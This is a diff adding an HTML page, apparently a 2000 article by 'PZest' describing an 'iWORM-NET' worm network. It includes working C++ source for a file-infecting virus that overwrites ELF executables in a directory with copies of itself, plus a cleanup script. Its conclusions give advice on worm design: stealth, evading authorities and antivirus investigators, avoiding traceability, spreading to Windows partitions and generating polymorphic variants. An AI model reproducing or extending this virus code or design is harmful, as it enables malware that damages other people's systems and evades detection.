+      if(dentp == NULL) 
+         exit(0); 
+ 
+      strcpy(filename, dentp-&gt;d_name); 
+      if(!strcmp(filename, Myname)) 
+         continue; 
+ 
+      fp = fopen(filename, "rb"); 
+      if(!fp) 
+         exit(0); 
+ 
+      for(int i=0; i&lt;5; i++) 
+      { 
+         ch = getc(fp); 
+         if(i&gt;0) 
+            buffer[i-1] = ch; 
+      } 
+      fclose(fp); 
+      if(!strncmp(buffer,"ELF", 3)) 
+      { 
+         namelen = strlen(filename); 
+         if(namelen&gt;10) 
+         { 
+            tailp = &(filename[namelen - 10]); 
+            if(!strcmp(tailp, "(original)")) 
+               continue; 
+         } 
+         strcpy(orgfilename,filename); 
+         strcat(orgfilename,"(original)"); 
+         if(access(orgfilename, F_OK) == 0) 
+            continue; 
+         stat(filename,&StatBuf1); 
+         stat("/bin/cp",&StatBuf2); 
+         if(StatBuf1.st_ino == StatBuf2.st_ino) 
+            continue;
+         rename(filename, orgfilename); 
+         sprintf(command,"cp %s %s",Myname, filename); 
+         system(command);  
+         strcpy(Myorgname, Myname); 
+         strcat(Myorgname, "(original)");  
+         execve(Myorgname, av, envp); 
+         exit(0); 
+      } 
+   } 
+}
+
+//The above is compiled with g++ filename.cc -o filename 
+************************************** end cut here **********************************
+</PRE>
+</blockquote>
+<P>
+end of fileworm code
+</P>
+<P> Fix Script <b>cleanup.sh</b> </P>
+<P>
+After experimenting with this binary code you may wish to clean up the harddisk and 
+remove the replicating code
+</P>
+<P> <b>Cleanup script <font color="#004080">cleanup.sh </font></b></P>
+<blockquote>
+  <PRE>
+************************************** cut here **********************************
+
+# 
+# check for mv and ls first!  
+if [ -f 'mv(original)' ]  
+then  
+   echo Restoring mv '(this will be found again - DONT PANIC!!!)'  
+   cp 'mv(original)' mv  
+fi  
+if [ -f 'ls(original)' ]  
+then  
+   echo Restoring ls  
+   mv 'ls(original)' ls  
+fi  
+for i in *'(original)'  
+do  
+ls -l $i  
+j=`basename $i '(original)'`  
+echo about to restore over $j  
+ls -l $j 
+echo ' Hit CR ' 
+read k  
+mv $i $j  
+echo Restored.  
+ls -l $j 
+echo  
+echo  
+done  
+
+************************************** end cut here **********************************
+</PRE>
+</blockquote>
+<P>
+end of cleanup script
+</P><P>
+make the above script executable with chmod +x 
+</P>
+<P> <font size="+1"><b><font color="#004080">Conclusions and Discussion </font></b></font></P>
+<P>
+This section will probably be published as a sort of bullet point. Due to lack of time for 
+writing it properly.
+</P>
+<ul>
+  <li> The key to survival strategy is stealth so every trick in the book must 
+    be considered. There's no point in writing such a system if it's going to 
+    be discovered in 5 minutes after its release. </li></ul>
+<ul>
+  <li>The iWORM-NET system could be described as an 'autonomous distributed bootstrap'. 
+  </li>
+</ul>
+<ul>
+  <li> The iWORM-NET should be written in ASM especially the client WORM VX, however 
+    there maybe a case for just writing the server WORM in C++ and take advantage 
+    of what high level languages have to offer. The reason for this is the fact 
+    that the server will be a large application anyway and possible wouldn't benefit 
+    from Assembly. </li></ul>
+<ul>
+  <li> Source code should be kept in the body of the server WORM. The server WORM 
+    would have the binary executable and the source code encapsulated. This way 
+    the server WORM would be able to recompile itself with the latest version 
+    of an updated function added to the operating system. It is very unlikely 
+    that standard function calls will change in name i.e. gethostbyname( ) isn't 
+    likely to change in the very near future is it. However the library 'socket.h' 
+    will probably be enhanced to take into account new features added to the ever-growing 
+    Internet. Of course the parameter values may change ever so slightly, well 
+    if it doesn't compile or kills the iWORM at run time, then call it 'Natural 
+    Selection'. One of the requirements in eLIFE, survival of the fittest. </li></ul>
+<ul>
+  <li> How much ISP IP info will be kept ? This question needs some consideration. 
+    If all the IP information is retained there could be a bit of a problem, size 
+    of storage is an obvious problem. More important reasons for not retaining 
+    every IP address obtained is because the entire network would be tracable, 
+    and tracable back to it's origins, (not good) secondly some IP information 
+    is more useful than others. The statistical probability that some connections 
+    will be better than others will play an important role in deciding what IP 
+    addresses are kept and which ones are dropped. There will also be a need to 
+    introduce some random variant into this calculation, to avoid stagnation in 
+    the system. </li></ul>
+<ul>
+  <li> The material presented in this document can equally be applied to Windows 
+    operating system and use WINSOCK.DLL. It wouldn't take a great deal of effort 
+    to construct a multi-operating / platform system iWORM-NET. In the case of 
+    a dual Linux / Windows system the Linux iWORM would carry a windows binary 
+    iWORM and could use the following type command to access Windows if it was 
+    on partition hda1 'mount -t vfat /dev/hda1 /mnt/hda1' . From here the server 
+    could just drop the windows iWORM entity or better still manipulate the file 
+    structure to guarentee success. </li></ul>
+<ul>
+  <li> A kick start process for the iWORM-NET would be a guarenteed connection 
+    to an IP address with the server WORM system intact. This could be done in 
+    a number of ways. An early launch would be to use a fixed website with an 
+    FTP binary downloadable. This would ensure the iWORM network gets established, 
+    critical mass if you like. The fall back with this stratergy is the likely 
+    hood of it's discovery by the authorities and AV investigators. Thus causing 
+    it's premature shutdown or worse still a mechamism to kill off the network 
+    with rouge code. </li></ul>
+<ul>
+  <li> The server WORM is responsible for the creation of client WORM VX. This 
+    creation process would call upon a vast library of VX templates, this would 
+    be of the form of a sort of VCK similar to ideas in widespead use. The different 
+    building blocks could be picked at random and assembled to form many variations 
+    of VX mechanisms. Throw in some high powered stealth and the possibilities 
+    are endless. </li>
+</ul>
+<P> <b>Copyright © PZest 2000 </b></P>
+<P>
+I take no responsibility for the damage you may cause to your own or other peoples 
+machines, the information provided in this paper is for your personal edification and not 
+for malicious damage on your part. If you don't know what you're doing then don't 
+tinker about with things you don't understand. I reserve copyright on this material so no 
+modifications either. 
+</P>
+<P> <b>References </b></P>
+<blockquote> 
+  <PRE>
+Douglas E. Comer.
+"Internetworking with TCP/IP"
+Prentice Hall. 
+ISBN 0-13-018380-6
+   
+Brian Komar.
+"TCP/IP Network Administration"
+SAMS. 
+ISBN 0-672-31250-6 
+
+Neil Matthew & Richard Stone.
+"Beginning Linux Programming"
+WROX PRESS.  
+ISBN 1-874416-68-0
+
+Rusling,  Pomerantz, Goldt, van  de Meer, Burkett, Welsh, Bowman, Sidiqqi, Tanuan
+"Linux Programming: White Papers
+Coriolis Open Press
+ISBN 1-57610-473-7</PRE>
+</blockquote>
+
+<hr>
+</BODY>
+</HTML>
